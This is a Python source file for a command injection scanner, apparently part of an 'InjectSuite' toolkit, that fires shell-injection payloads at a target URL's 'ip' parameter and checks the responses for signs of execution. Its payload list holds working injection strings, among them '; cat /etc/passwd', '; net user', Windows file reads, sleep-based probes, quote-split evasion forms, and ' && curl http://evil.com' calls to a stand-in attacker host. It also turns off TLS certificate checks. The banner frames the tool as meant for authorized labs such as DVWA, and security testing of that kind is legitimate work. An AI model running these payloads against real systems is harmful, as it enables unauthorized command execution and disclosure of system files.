#!/usr/bin/env python3
# Command Injection module for InjectSuite

import requests
import urllib3
import argparse
import logging
import json
from typing import List, Dict, Optional
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.logging import RichHandler
from rich.panel import Panel
from rich.prompt import Prompt

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()

CONFIG = {
    "timeout": 6,
    "indicators": [
        "uid=", "gid=", "root", "admin", "user", "nobody",
        "linux", "unix", "windows", "tcp", "VULN_TEST_123"
    ],
    "headers": {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "InjectSuite-CommandInjectionScanner/2.0"
    },
    "payloads": [
        "; whoami",
        " && whoami",
        " | whoami",
        " `whoami`",
        " $(whoami)",
        "; id",
        " && id",
        " | id",
        "; uname -a",
        " && uname -a",
        "; cat /etc/passwd",
        " | cat /etc/passwd",
        "; ping -c 1 127.0.0.1",
        " && netstat -an",
        "; echo VULN_TEST_123",
        "; ls -la",
        " & whoami",
        " | dir",
        " & dir",
        "; ver",
        " & ver",
        "; net user",
        " & net user",
        "; type C:\\Windows\\win.ini",
        " & type C:\\Windows\\win.ini",
        " ; sleep 5",
        " | sleep 5",
        " & timeout /t 5",
        " ; ping -n 5 127.0.0.1",
        " && curl http://evil.com",
        " && wget http://evil.com",
        "|| whoami",
        "|| id",
        "$(id)",
        "`id`",
        "{whoami,}",
        "w'h'o'a'm'i",
        "w\"h\"o\"a\"m\"i",
        "$(echo 123)",
    ]
}


def setup_logging():
    logging.basicConfig(
        level=logging.INFO,
        format="%(message)s",
        handlers=[RichHandler(show_time=False, show_level=False)]
    )


def scan_command_injection(
        url: str,
        method: str = "POST",
        cookies: Optional[Dict[str, str]] = None,
        base_input: str = ""
) -> List[Dict]:

    session = requests.Session()
    session.verify = False
    session.headers.update(CONFIG["headers"])

    if cookies is None:
        cookies = {}

    results = []

    console.print(f"[cyan]Checking indicators:[/cyan] {', '.join(CONFIG['indicators'])}")
    console.print(f"[cyan]Starting command injection scan on:[/cyan] {url}\n")

    with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            transient=True
    ) as progress:

        task = progress.add_task("[green]Scanning payloads...", total=len(CONFIG["payloads"]))

        for payload in CONFIG["payloads"]:

            final_payload = f"{base_input}{payload}" if base_input else payload

            progress.update(task, description=f"[+] Testing payload.....", advance=1)

            console.print(f"[cyan][+] Testing payload: {final_payload}[/cyan]")

            try:

                if method.upper() == "POST":

                    response = session.post(
                        url,
                        data={
                            "ip": final_payload,
                            "Submit": "Submit"
                        },
                        cookies=cookies,
                        timeout=CONFIG["timeout"]
                    )

                else:

                    response = session.get(
                        url,
                        params={"ip": final_payload},
                        cookies=cookies,
                        timeout=CONFIG["timeout"]
                    )

                content_lower = response.text.lower()

                detected_indicators = [
                    i for i in CONFIG["indicators"] if i.lower() in content_lower
                ]

                result = {
                    "payload": final_payload,
                    "status_code": response.status_code,
                    "indicators_found": detected_indicators
                }

                if detected_indicators:

                    console.print(f"\n[bold red]⚠ Command Injection Detected! Payload: {final_payload}[/bold red]")
                    # console.print(f"[yellow]Payload:[/yellow] {final_payload}")
                    # console.print(f"[yellow]Indicators:[/yellow] {', '.join(detected_indicators)}\n")

                results.append(result)

            except requests.RequestException as e:

                logging.error(f"Error with payload '{final_payload}': {str(e)}")

                results.append({
                    "payload": final_payload,
                    "status_code": None,
                    "indicators_found": [],
                    "error": str(e)
                })

    return results


def display_results_table(results: List[Dict]):

    table = Table(
        title="[cyan bold]Command Injection Scan Results[/cyan bold]",
        show_header=True,
        header_style="bold magenta"
    )

    table.add_column("Payload", style="cyan")
    table.add_column("Status Code", style="green")
    table.add_column("Indicators Found", style="yellow")

    for result in results:

        status_code = str(result.get("status_code", "N/A"))

        indicators = ", ".join(result["indicators_found"]) if result["indicators_found"] else "None"

        table.add_row(result["payload"], status_code, indicators)

    console.print(table)


def run_cmdi_scanner(
        interactive: bool = True,
        target_url: Optional[str] = None,
        method: str = "POST",
        cookies: Optional[Dict[str, str]] = None
) -> List[Dict]:

    setup_logging()

    if interactive:

        welcome_text = r"""
[bold bright_cyan]
 .d8888b.  888b     d888 8888888b.                             
d88P  Y88b 8888b   d8888 888  "Y88b                            
888    888 88888b.d88888 888    888                            
888        888Y88888P888 888    888                            
888        888 Y888P 888 888    888                            
888    888 888  Y8P  888 888    888                            
Y88b  d88P 888   "   888 888  .d88P                            
 "Y8888P"  888       888 8888888P"                             
                                                               
 .d8888b.                                                      
d88P  Y88b                                                     
Y88b.                                                          
 "Y888b.    .d8888b  8888b.  88888b.  88888b.   .d88b.  888d888
    "Y88b. d88P"        "88b 888 "88b 888 "88b d8P  Y8b 888P"  
      "888 888      .d888888 888  888 888  888 88888888 888    
Y88b  d88P Y88b.    888  888 888  888 888  888 Y8b.     888    
 "Y8888P"   "Y8888P "Y888888 888  888 888  888  "Y8888  888    
[/bold bright_cyan]
[bold bright_green]Welcome to Command Injection Scanner[/bold bright_green]

[bright_yellow]This tool is intended for educational and authorized security testing only.[/bright_yellow]
[bright_red]⚠️  Do NOT use this tool against live or unauthorized websites.[/bright_red]
[bright_blue]✔ Always test in legal, controlled environments (e.g., DVWA, Juice Shop, TestFire).[/bright_blue]
"""

        console.print(
            Panel.fit(
                welcome_text,
                title="[bold bright_magenta]🛡 Command Injection Detection - Ethical Hacking Toolkit 🛡[/bold bright_magenta]",
                border_style="bright_cyan",
            )
        )

        target_url = Prompt.ask("[bold green]Enter target URL[/bold green]").strip()

        method = Prompt.ask(
            "[bold green]HTTP method[/bold green]",
            choices=["GET", "POST"],
            default="POST"
        )

        base_input = Prompt.ask(
            "[bold green]Optional base input (e.g., 127.0.0.1)[/bold green]",
            default=""
        )

        cookies_input = Prompt.ask(
            "[bold green]Cookies JSON (or leave blank)[/bold green]",
            default=""
        )

        try:
            cookies = json.loads(cookies_input) if cookies_input else {}
        except json.JSONDecodeError:
            cookies = {}

    else:

        base_input = ""

        if isinstance(cookies, str):
            cookies = json.loads(cookies)

    results = scan_command_injection(
        target_url,
        method,
        cookies,
        base_input
    )

    display_results_table(results)

    detected = sum(1 for r in results if r.get("indicators_found"))

    if detected:
        console.print(f"[bold red]⚠ {detected} potential vulnerabilities detected.[/bold red]")
    else:
        console.print(f"[bold green]✔ No command injection indicators found.[/bold green]")

    return results


if __name__ == "__main__":

    parser = argparse.ArgumentParser(description="Command Injection Scanner")

    parser.add_argument("url", nargs="?", help="Target URL")
    parser.add_argument("--method", choices=["GET", "POST"], default="POST")
    parser.add_argument("--cookies", help="Cookies JSON string")

    args = parser.parse_args()

    if args.url:

        cookies = None

        if args.cookies:
            cookies = json.loads(args.cookies)

        run_cmdi_scanner(
            interactive=False,
            target_url=args.url,
            method=args.method,
            cookies=cookies
        )

    else:

        run_cmdi_scanner(interactive=True)